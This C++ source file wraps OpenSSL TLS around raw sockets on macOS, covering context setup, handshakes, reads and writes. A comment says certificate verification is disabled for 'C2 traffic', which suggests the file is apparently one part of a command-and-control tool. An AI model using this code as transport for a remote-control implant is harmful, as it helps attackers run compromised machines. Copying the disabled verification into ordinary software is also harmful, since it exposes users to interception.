// ============================================================================
// tls_wrapper.cpp — OpenSSL TLS Wrapper Implementation
// ============================================================================
// Lightweight TLS layer over raw TCP sockets.
// Only active on macOS (__APPLE__). Windows continues using raw sockets.
// ============================================================================

#include "tls_wrapper.h"
#include <cstdio>
#include <cstring>

// ============================================================================
// INITIALIZATION
// ============================================================================
bool tls_init() {
#ifdef __APPLE__
    SSL_library_init();
    OpenSSL_add_all_algorithms();
    SSL_load_error_strings();
    return true;
#else
    return true; // No TLS on Windows — raw sockets only
#endif
}

void tls_cleanup() {
#ifdef __APPLE__
    // OpenSSL doesn't require explicit cleanup in most cases
    // EVP_cleanup() and ERR_free_strings() are deprecated in 3.x
#endif
}

// ============================================================================
// CLIENT CONTEXT
// ============================================================================
void* tls_create_client_ctx() {
#ifdef __APPLE__
    const SSL_METHOD* method = TLS_client_method();
    SSL_CTX* ctx = SSL_CTX_new(method);
    if (!ctx) return nullptr;

    // Allow self-signed certificates (no verification for C2 traffic)
    SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, nullptr);

    // Use modern TLS
    SSL_CTX_set_min_proto_version(ctx, TLS1_2_VERSION);
    SSL_CTX_set_max_proto_version(ctx, TLS1_3_VERSION);

    return (void*)ctx;
#else
    return nullptr;
#endif
}

// ============================================================================
// SERVER CONTEXT
// ============================================================================
void* tls_create_server_ctx(const char* cert_file, const char* key_file) {
#ifdef __APPLE__
    const SSL_METHOD* method = TLS_server_method();
    SSL_CTX* ctx = SSL_CTX_new(method);
    if (!ctx) return nullptr;

    // Load certificate and key
    if (SSL_CTX_use_certificate_file(ctx, cert_file, SSL_FILETYPE_PEM) <= 0) {
        fprintf(stderr, "[TLS] Failed to load certificate: %s\n", cert_file);
        SSL_CTX_free(ctx);
        return nullptr;
    }

    if (SSL_CTX_use_PrivateKey_file(ctx, key_file, SSL_FILETYPE_PEM) <= 0) {
        fprintf(stderr, "[TLS] Failed to load private key: %s\n", key_file);
        SSL_CTX_free(ctx);
        return nullptr;
    }

    // Verify key matches certificate
    if (!SSL_CTX_check_private_key(ctx)) {
        fprintf(stderr, "[TLS] Private key does not match certificate\n");
        SSL_CTX_free(ctx);
        return nullptr;
    }

    // Use modern TLS
    SSL_CTX_set_min_proto_version(ctx, TLS1_2_VERSION);
    SSL_CTX_set_max_proto_version(ctx, TLS1_3_VERSION);

    return (void*)ctx;
#else
    (void)cert_file; (void)key_file;
    return nullptr;
#endif
}

// ============================================================================
// FREE CONTEXT
// ============================================================================
void tls_free_ctx(void* ctx) {
#ifdef __APPLE__
    if (ctx) {
        SSL_CTX_free((SSL_CTX*)ctx);
    }
#else
    (void)ctx;
#endif
}

// ============================================================================
// WRAP SOCKET
// ============================================================================
void* tls_wrap_socket(void* ctx, int socket_fd) {
#ifdef __APPLE__
    if (!ctx) return nullptr;

    SSL* ssl = SSL_new((SSL_CTX*)ctx);
    if (!ssl) return nullptr;

    SSL_set_fd(ssl, socket_fd);
    return (void*)ssl;
#else
    (void)ctx; (void)socket_fd;
    return nullptr;
#endif
}

// ============================================================================
// CLIENT HANDSHAKE
// ============================================================================
bool tls_connect(void* ssl) {
#ifdef __APPLE__
    if (!ssl) return false;
    int ret = SSL_connect((SSL*)ssl);
    return ret == 1;
#else
    (void)ssl;
    return false;
#endif
}

// ============================================================================
// SERVER HANDSHAKE
// ============================================================================
bool tls_accept(void* ssl) {
#ifdef __APPLE__
    if (!ssl) return false;
    int ret = SSL_accept((SSL*)ssl);
    return ret == 1;
#else
    (void)ssl;
    return false;
#endif
}

// ============================================================================
// READ — Returns bytes read, 0 on disconnect, negative on error
// ============================================================================
int tls_read(void* ssl, char* buf, int len) {
#ifdef __APPLE__
    if (!ssl) return -1;
    int ret = SSL_read((SSL*)ssl, buf, len);
    if (ret <= 0) {
        int err = SSL_get_error((SSL*)ssl, ret);
        if (err == SSL_ERROR_ZERO_RETURN) return 0;  // Clean shutdown
        return -1;  // Error
    }
    return ret;
#else
    (void)ssl; (void)buf; (void)len;
    return -1;
#endif
}

// ============================================================================
// WRITE — Returns bytes written, negative on error
// ============================================================================
int tls_write(void* ssl, const char* buf, int len) {
#ifdef __APPLE__
    if (!ssl) return -1;
    return SSL_write((SSL*)ssl, buf, len);
#else
    (void)ssl; (void)buf; (void)len;
    return -1;
#endif
}

// ============================================================================
// SHUTDOWN
// ============================================================================
void tls_shutdown(void* ssl) {
#ifdef __APPLE__
    if (ssl) {
        SSL_shutdown((SSL*)ssl);
        SSL_free((SSL*)ssl);
    }
#else
    (void)ssl;
#endif
}
